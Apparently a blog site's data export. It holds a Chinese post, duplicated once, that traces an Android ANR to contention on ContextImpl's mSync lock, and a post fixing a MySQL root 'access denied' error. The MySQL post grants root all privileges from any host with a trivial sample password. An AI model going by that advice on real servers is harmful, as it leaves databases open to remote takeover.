Blocked 这样的片段，main表示主线程，prio即priority，线程优先级（这里不是重点），tid就是thread的id，即线程id，最后标记了Blocked，表示线程阻塞了。<br>接着的信息就是告诉你线程被哪个鬼lock了，关注这行：<br><strong>waiting to lock &lt;0x0cfeaaf2&gt; (a java.lang.Object) held by thread 24</strong><br>说明主线程的getPreferencesDir方法等着要去锁一个id为<strong>0x0cfeaaf2</strong>的Object类型的对象，但是被该死的tid&#x3D;24的线程抢占了！让我来看看是谁，于是我们可以直接在traces文件里全局搜索0x0cfeaaf2或者tid&#x3D;24这些字符串，锁定到如下日志：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;PackageProcessor&quot; daemon prio=5 tid=24 Native</span><br><span class=\"line\">group=&quot;main&quot; sCount=1 dsCount=0 obj=0x32c06af0 self=0x7fb0f36400</span><br><span class=\"line\">...</span><br><span class=\"line\">native: #06 pc 0000000000862c18 /system/framework/arm64/boot-framework.oat (Java_android_os_BinderProxy_transactNative__ILandroid_os_Parcel_2Landroid_os_Parcel_2I+196)</span><br><span class=\"line\">at android.os.BinderProxy.transactNative(Native method)</span><br><span class=\"line\">at android.os.BinderProxy.transact(Binder.java:620)</span><br><span class=\"line\">at android.os.storage.IMountService$Stub$Proxy.mkdirs(IMountService.java:870)</span><br><span class=\"line\">at android.app.ContextImpl.ensureExternalDirsExistOrFilter(ContextImpl.java:2228)</span><br><span class=\"line\">at android.app.ContextImpl.getExternalFilesDirs(ContextImpl.java:586)</span><br><span class=\"line\">- locked &lt;0x0cfeaaf2&gt; (a java.lang.Object)</span><br><span class=\"line\">at android.app.ContextImpl.getExternalFilesDir(ContextImpl.java:569)</span><br><span class=\"line\">at android.content.ContextWrapper.getExternalFilesDir(ContextWrapper.java:243)</span><br><span class=\"line\">at com.xxx.push.log.xxx.writeLog2File(xxx.java:100)</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>这里很明显就看到了 <strong>locked &lt;0x0cfeaaf2&gt; (a java.lang.Object)</strong> ，某个和推送服务相关的writeLog2File方法调用了getExternalFilesDirs，然后此方法进一步锁住了 <strong>0x0cfeaaf2</strong> 对象，没错，<strong>这个对象和刚才主线程等待要锁的对象是同一个。</strong><br>所以主线程被tid&#x3D;24的线程阻塞了，因为两个线程需要同一把对象锁，tid&#x3D;24线程一直占着茅坑，导致死锁，ANR就这么爆出来了。</p>\n<h2 id=\"了解Context\"><a href=\"#了解Context\" class=\"headerlink\" title=\"了解Context\"></a>了解Context</h2><p>Context是一个抽象类，ContextImpl是Context的实现类（具体一些继承关系可参考<a href=\"https://www.jianshu.com/p/94e0f9ab3f1d\">Context都没弄明白，还怎么做Android开发？</a>，某大佬写的，比较全面）。<br>那么，上面的ANR我们重点关注的对象0x0cfeaaf2到底是谁呢？根据这一行：<br><strong>at android.app.ContextImpl.getPreferencesDir(ContextImpl.java:483)</strong><br>我们直接Read the fucking code，看看ContextImpl中这个方法在干啥：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> File <span class=\"title function_\">getPreferencesDir</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mSync) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mPreferencesDir == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            mPreferencesDir = <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(getDataDir(), <span class=\"string\">&quot;shared_prefs&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ensurePrivateDirExists(mPreferencesDir);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可见，这里涉及到shared_prefs文件的IO操作，系统考虑到线程安全，搞了个同步锁，mSync对象被锁住。这个mSync就是我们刚才反复提到的id为0x0cfeaaf2的Object对象，去看看它的实例化就知晓了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"type\">Object</span> <span class=\"variable\">mSync</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>();</span><br></pre></td></tr></table></figure>\n\n<p>private final，两个关键字合体了，说明这个成员是不可变的，而且是私有的，不准继承，即在Context的生命周期内全局只实例化一次，这样才能在加锁的时候保证唯一性。<br>接下来又看刚才tid&#x3D;24给对象加锁的方法，源码自然也在ContextImpl中：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> File[] getExternalFilesDirs(String type) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mSync) &#123;</span><br><span class=\"line\">        File[] dirs = Environment.buildExternalStorageAppFilesDirs(getPackageName());</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (type != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            dirs = Environment.buildPaths(dirs, type);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ensureExternalDirsExistOrFilter(dirs);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>OK，它也有给mSync加锁的操作， <strong>所以tid&#x3D;24线程的getExternalFilesDirs方法先加锁，造成主线程的getPreferencesDir方法抢不到这把锁，这真是喧宾夺主啊！</strong> 你区区一个子线程和主线程作对，分析到此我们基本清楚了这次ANR是怎么来的了。<br>这里我们进一步看看上面return的ensureExternalDirsExistOrFilter方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Ensure that given directories exist, trying to create them if missing. If</span></span><br><span class=\"line\"><span class=\"comment\"> * unable to create, they are filtered by replacing with &#123;<span class=\"doctag\">@code</span> null&#125;.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> File[] ensureExternalDirsExistOrFilter(File[] dirs) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">StorageManager</span> <span class=\"variable\">sm</span> <span class=\"operator\">=</span> getSystemService(StorageManager.class);</span><br><span class=\"line\">    <span class=\"keyword\">final</span> File[] result = <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>[dirs.length];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; dirs.length; i++) &#123;</span><br><span class=\"line\">        <span class=\"type\">File</span> <span class=\"variable\">dir</span> <span class=\"operator\">=</span> dirs[i];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!dir.exists()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!dir.mkdirs()) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// recheck existence in case of cross-process race</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!dir.exists()) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// Failing to mkdir() may be okay, since we might not have</span></span><br><span class=\"line\">                    <span class=\"comment\">// enough permissions; ask vold to create on our behalf.</span></span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        sm.mkdirs(dir);</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                        Log.w(TAG, <span class=\"string\">&quot;Failed to ensure &quot;</span> + dir + <span class=\"string\">&quot;: &quot;</span> + e);</span><br><span class=\"line\">                        dir = <span class=\"literal\">null</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        result[i] = dir;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我的天鸭，你看看，这操作多重啊，又是循环又是创建文件的，还有getSystemService这些系统服务对端调用，加在一起就是灰常耗时的操作，尤其是在文件目录极其散乱繁杂而且磁盘读写性能还不好的时候，此方法将进一步延长阻塞时间。</p>\n<p>我又一想，什么SP啊，DB啊，外部存储啊这些我们平时经常访问啊，也并不是那么容易就ANR的。也就是说虽然上面的系统方法操作很繁杂，但应该不是导致最终问题的核心因素。</p>\n<p>经过我反复分析traces文件，发现除了main线程在wait to lock这把锁，还有几个其它的子线程也在等待锁（有一些是访问App本地数据库的，最终调用也在ContextImpl中，和上面分析的两个方法类似）。说明当前这短暂的时间内，需要通过某个Context进行的IO操作太多了，各个线程都排着队要锁mSync，所以耗时操作不可怕，可怕的是一窝蜂全上来。自然就增大了ANR的风险。如果你反复遇到这种ANR，就应该考虑优化了。</p>\n<p>最终，追溯到方法调用的源头，是在Application初始化时，各种SDK加载，以及一些业务逻辑触发。很显然，它们都是通过getApplicationContext来拿到的同一个Context引用，请求锁的也是同一个mSync对象。</p>\n<h2 id=\"结论与建议\"><a href=\"#结论与建议\" class=\"headerlink\" title=\"结论与建议\"></a>结论与建议</h2><ul>\n<li>调用Context相关的IO操作，不是启个子线程就高枕无忧了，由上面分析，mSync对象锁就这么一把，该阻塞还是阻塞，和是不是主线程无关。</li>\n<li>尽量不要在Application的初始化时刻进行太多的方法调用，尤其是针对ApplicationContext的IO操作。</li>\n<li>在主Activity中延后初始化，用IntentService进行异步操作（因为实例化一个Service就是另一个Context对象了）等都是比较好的优化方案。</li>\n<li>所以为什么有大佬说不要滥用SharedPreference，它的性能并不是很好，从本文分析也可知它直接可能阻塞UI线程，试图寻找其它替代品吧。</li>\n<li>广播接收onReceive里面可以用goAsync异步处理，见：<a href=\"https://blog.csdn.net/ysy950803/article/details/83216891\">goAsync帮你在onReceive中简便地进行异步操作</a>。</li>\n<li>…想到再说，也欢迎大家补充。</li>\n</ul>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>ANR是Android的老大难了，关于这方面的基础知识和深入好文都非常多，大家不妨谷歌一下。<br>最近搭载骁龙855的小米9也发布了，移动平台的设备性能越来越强，许多App大多时候其实都吃不完那么多计算资源。<br>说得可能不好听一点，很多烂代码要是在很多年前的手机上，本该导致卡顿（甚至是ANR）的，但由于如今强大的计算性能，卡顿几率大大减小了。从某方面来说增大了程序的容错，同时也掩盖了程序本身的缺陷。</p>\n</blockquote>\n<p>今天的题目关键词是“简单分析”和“深入了解”，哈哈，可能对于大佬们来说这些内容并不深入，所以我措辞为“了解”，望轻喷。</p>\n<h2 id=\"分析traces文件\"><a href=\"#分析traces文件\" class=\"headerlink\" title=\"分析traces文件\"></a>分析traces文件</h2><p>前段时间，业务质量平台报上来很多ANR，我是一看就头疼呀！每次心里都犯嘀咕，我怎么就从来没遇到ANR呢？你们到底是怎么使用的。<br>吐槽归吐槽，问题还是要解决的，Android的系统日志打包上来一般都会有traces.txt文件（还有event log等等，这里给大家硬广一下我另一篇<a href=\"https://blog.csdn.net/ysy950803/article/details/83214432\">使用可视化的ChkBugreport分析log文件</a>），也是我们分析这类问题的入口，里面记录了各个应用进程和系统进程的函数堆栈信息。于是乎，抓一份来瞧瞧：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;main&quot; prio=5 tid=1 Blocked</span><br><span class=\"line\">group=&quot;main&quot; sCount=1 dsCount=0 obj=0x75afba88 self=0x7fb0e96a00</span><br><span class=\"line\">...</span><br><span class=\"line\">at android.app.ContextImpl.getPreferencesDir(ContextImpl.java:483)</span><br><span class=\"line\">- waiting to lock &lt;0x0cfeaaf2&gt; (a java.lang.Object) held by thread 24</span><br><span class=\"line\">at android.app.ContextImpl.getSharedPreferencesPath(ContextImpl.java:665)</span><br><span class=\"line\">at android.app.ContextImpl.getSharedPreferences(ContextImpl.java:364)</span><br><span class=\"line\">- locked &lt;0x09b0b543&gt; (a java.lang.Class&lt;android.app.ContextImpl&gt;)</span><br><span class=\"line\">at android.content.ContextWrapper.getSharedPreferences(ContextWrapper.java:174)</span><br><span class=\"line\">at android.content.ContextWrapper.getSharedPreferences(ContextWrapper.java:174)</span><br><span class=\"line\">...</span><br><span class=\"line\">at com.xxx.receiver.xxx.onReceive(xxx.java:36)</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>这里简单解释一下，ANR无非就是UI线程Block了，所以我们找到形如 “main” prio&#x3D;5 tid&#x3D;1 Blocked 这样的片段，main表示主线程，prio即priority，线程优先级（这里不是重点），tid就是thread的id，即线程id，最后标记了Blocked，表示线程阻塞了。<br>接着的信息就是告诉你线程被哪个鬼lock了，关注这行：<br><strong>waiting to lock &lt;0x0cfeaaf2&gt; (a java.lang.Object) held by thread 24</strong><br>说明主线程的getPreferencesDir方法等着要去锁一个id为<strong>0x0cfeaaf2</strong>的Object类型的对象，但是被该死的tid&#x3D;24的线程抢占了！让我来看看是谁，于是我们可以直接在traces文件里全局搜索0x0cfeaaf2或者tid&#x3D;24这些字符串，锁定到如下日志：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;PackageProcessor&quot; daemon prio=5 tid=24 Native</span><br><span class=\"line\">group=&quot;main&quot; sCount=1 dsCount=0 obj=0x32c06af0 self=0x7fb0f36400</span><br><span class=\"line\">...</span><br><span class=\"line\">native: #06 pc 0000000000862c18 /system/framework/arm64/boot-framework.oat (Java_android_os_BinderProxy_transactNative__ILandroid_os_Parcel_2Landroid_os_Parcel_2I+196)</span><br><span class=\"line\">at android.os.BinderProxy.transactNative(Native method)</span><br><span class=\"line\">at android.os.BinderProxy.transact(Binder.java:620)</span><br><span class=\"line\">at android.os.storage.IMountService$Stub$Proxy.mkdirs(IMountService.java:870)</span><br><span class=\"line\">at android.app.ContextImpl.ensureExternalDirsExistOrFilter(ContextImpl.java:2228)</span><br><span class=\"line\">at android.app.ContextImpl.getExternalFilesDirs(ContextImpl.java:586)</span><br><span class=\"line\">- locked &lt;0x0cfeaaf2&gt; (a java.lang.Object)</span><br><span class=\"line\">at android.app.ContextImpl.getExternalFilesDir(ContextImpl.java:569)</span><br><span class=\"line\">at android.content.ContextWrapper.getExternalFilesDir(ContextWrapper.java:243)</span><br><span class=\"line\">at com.xxx.push.log.xxx.writeLog2File(xxx.java:100)</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>这里很明显就看到了 <strong>locked &lt;0x0cfeaaf2&gt; (a java.lang.Object)</strong> ，某个和推送服务相关的writeLog2File方法调用了getExternalFilesDirs，然后此方法进一步锁住了 <strong>0x0cfeaaf2</strong> 对象，没错，<strong>这个对象和刚才主线程等待要锁的对象是同一个。</strong><br>所以主线程被tid&#x3D;24的线程阻塞了，因为两个线程需要同一把对象锁，tid&#x3D;24线程一直占着茅坑，导致死锁，ANR就这么爆出来了。</p>\n<h2 id=\"了解Context\"><a href=\"#了解Context\" class=\"headerlink\" title=\"了解Context\"></a>了解Context</h2><p>Context是一个抽象类，ContextImpl是Context的实现类（具体一些继承关系可参考<a href=\"https://www.jianshu.com/p/94e0f9ab3f1d\">Context都没弄明白，还怎么做Android开发？</a>，某大佬写的，比较全面）。<br>那么，上面的ANR我们重点关注的对象0x0cfeaaf2到底是谁呢？根据这一行：<br><strong>at android.app.ContextImpl.getPreferencesDir(ContextImpl.java:483)</strong><br>我们直接Read the fucking code，看看ContextImpl中这个方法在干啥：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> File <span class=\"title function_\">getPreferencesDir</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mSync) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mPreferencesDir == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            mPreferencesDir = <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(getDataDir(), <span class=\"string\">&quot;shared_prefs&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ensurePrivateDirExists(mPreferencesDir);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可见，这里涉及到shared_prefs文件的IO操作，系统考虑到线程安全，搞了个同步锁，mSync对象被锁住。这个mSync就是我们刚才反复提到的id为0x0cfeaaf2的Object对象，去看看它的实例化就知晓了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"type\">Object</span> <span class=\"variable\">mSync</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>();</span><br></pre></td></tr></table></figure>\n\n<p>private final，两个关键字合体了，说明这个成员是不可变的，而且是私有的，不准继承，即在Context的生命周期内全局只实例化一次，这样才能在加锁的时候保证唯一性。<br>接下来又看刚才tid&#x3D;24给对象加锁的方法，源码自然也在ContextImpl中：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> File[] getExternalFilesDirs(String type) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mSync) &#123;</span><br><span class=\"line\">        File[] dirs = Environment.buildExternalStorageAppFilesDirs(getPackageName());</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (type != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            dirs = Environment.buildPaths(dirs, type);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ensureExternalDirsExistOrFilter(dirs);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>OK，它也有给mSync加锁的操作， <strong>所以tid&#x3D;24线程的getExternalFilesDirs方法先加锁，造成主线程的getPreferencesDir方法抢不到这把锁，这真是喧宾夺主啊！</strong> 你区区一个子线程和主线程作对，分析到此我们基本清楚了这次ANR是怎么来的了。<br>这里我们进一步看看上面return的ensureExternalDirsExistOrFilter方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Ensure that given directories exist, trying to create them if missing. If</span></span><br><span class=\"line\"><span class=\"comment\"> * unable to create, they are filtered by replacing with &#123;<span class=\"doctag\">@code</span> null&#125;.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> File[] ensureExternalDirsExistOrFilter(File[] dirs) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">StorageManager</span> <span class=\"variable\">sm</span> <span class=\"operator\">=</span> getSystemService(StorageManager.class);</span><br><span class=\"line\">    <span class=\"keyword\">final</span> File[] result = <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>[dirs.length];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; dirs.length; i++) &#123;</span><br><span class=\"line\">        <span class=\"type\">File</span> <span class=\"variable\">dir</span> <span class=\"operator\">=</span> dirs[i];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!dir.exists()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!dir.mkdirs()) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// recheck existence in case of cross-process race</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!dir.exists()) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// Failing to mkdir() may be okay, since we might not have</span></span><br><span class=\"line\">                    <span class=\"comment\">// enough permissions; ask vold to create on our behalf.</span></span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        sm.mkdirs(dir);</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                        Log.w(TAG, <span class=\"string\">&quot;Failed to ensure &quot;</span> + dir + <span class=\"string\">&quot;: &quot;</span> + e);</span><br><span class=\"line\">                        dir = <span class=\"literal\">null</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        result[i] = dir;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我的天鸭，你看看，这操作多重啊，又是循环又是创建文件的，还有getSystemService这些系统服务对端调用，加在一起就是灰常耗时的操作，尤其是在文件目录极其散乱繁杂而且磁盘读写性能还不好的时候，此方法将进一步延长阻塞时间。</p>\n<p>我又一想，什么SP啊，DB啊，外部存储啊这些我们平时经常访问啊，也并不是那么容易就ANR的。也就是说虽然上面的系统方法操作很繁杂，但应该不是导致最终问题的核心因素。</p>\n<p>经过我反复分析traces文件，发现除了main线程在wait to lock这把锁，还有几个其它的子线程也在等待锁（有一些是访问App本地数据库的，最终调用也在ContextImpl中，和上面分析的两个方法类似）。说明当前这短暂的时间内，需要通过某个Context进行的IO操作太多了，各个线程都排着队要锁mSync，所以耗时操作不可怕，可怕的是一窝蜂全上来。自然就增大了ANR的风险。如果你反复遇到这种ANR，就应该考虑优化了。</p>\n<p>最终，追溯到方法调用的源头，是在Application初始化时，各种SDK加载，以及一些业务逻辑触发。很显然，它们都是通过getApplicationContext来拿到的同一个Context引用，请求锁的也是同一个mSync对象。</p>\n<h2 id=\"结论与建议\"><a href=\"#结论与建议\" class=\"headerlink\" title=\"结论与建议\"></a>结论与建议</h2><ul>\n<li>调用Context相关的IO操作，不是启个子线程就高枕无忧了，由上面分析，mSync对象锁就这么一把，该阻塞还是阻塞，和是不是主线程无关。</li>\n<li>尽量不要在Application的初始化时刻进行太多的方法调用，尤其是针对ApplicationContext的IO操作。</li>\n<li>在主Activity中延后初始化，用IntentService进行异步操作（因为实例化一个Service就是另一个Context对象了）等都是比较好的优化方案。</li>\n<li>所以为什么有大佬说不要滥用SharedPreference，它的性能并不是很好，从本文分析也可知它直接可能阻塞UI线程，试图寻找其它替代品吧。</li>\n<li>广播接收onReceive里面可以用goAsync异步处理，见：<a href=\"https://blog.csdn.net/ysy950803/article/details/83216891\">goAsync帮你在onReceive中简便地进行异步操作</a>。</li>\n<li>…想到再说，也欢迎大家补充。</li>\n</ul>\n"},{"layout":"post","title":"授权后连接MySQL依然被拒绝访问（Access denied for user 'root'@'localhost'）","subtitle":"那是真的牛逼。","date":"2019-03-08T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n我们在Spring Boot的应用配置中一般都会如下：\n\n```\njdbc:mysql://123.123.123.123:3306/db_name?useUnicode=true&characterEncoding=UTF-8&allowMultiQueries=true\n```\n123.123.123.123是MySQL数据库所在主机的IP地址，如果你想要远程访问数据库，就必须授权，一般这样操作：\n\n```\nGRANT ALL PRIVILEGES ON *.* TO 'root'@'%'IDENTIFIED BY '12345' WITH GRANT OPTION;\nFLUSH PRIVILEGES;\n```\n12345是你设置的访问密码。\n但有时候我们轻量应用服务都是单机的，根本不用远程访问，也就是说上面的配置我会这样写：\n\n```\njdbc:mysql://localhost:3306/byd?useUnicode=true&characterEncoding=UTF-8&allowMultiQueries=true\n```\n然后查看Tomcat日志发现Access denied for user 'root'@'localhost'，于是乎我们自然想到上面授权的%并不通配localhost，所以单独给localhost授权：\n\n```\nGRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost'IDENTIFIED BY '12345' WITH GRANT OPTION;\nFLUSH PRIVILEGES;\n```\n一般到这应该没啥问题了，但我发现我的Web应用还是被拒绝访问，我有点慌了。马上去看mysql的user表：\n\n```sql\nSELECT user,host,password FROM mysql.user;\n```\n出现惊人一幕：\n\n| user | host | password |\n| ------ | ------ | ------ |\n| root | % | *xxxxxx |\n| root | 127.0.0.1 | *yyyyyy |\n| root | ::1 | *yyyyyy |\n| root | localhost | *xxxxxx |\n\n这里 *xxxxxx 和 *yyyyyy 只是做示范，总之情况就是我刚才给localhost设置的密码和127.0.0.1的密码不一样，这说明以前这个数据库给127.0.0.1单独授权过，所以导致localhost解析到本机地址后密码不对应，最终被拒绝访问。\n\n这里的解决办法就是把它们都设成一样的密码，就OK了：\n\n```sql\nUPDATE mysql.user SET password=PASSWORD('123456') WHERE user='root';\n```\n注意用PASSWORD()函数对密码进行加密，否则会变成明文。\n\n","source":"_posts/2019-03-07-授权后连接MySQL依然被拒绝访问（Access denied for user 'root'@'localhost'）.md","raw":"---\nlayout:   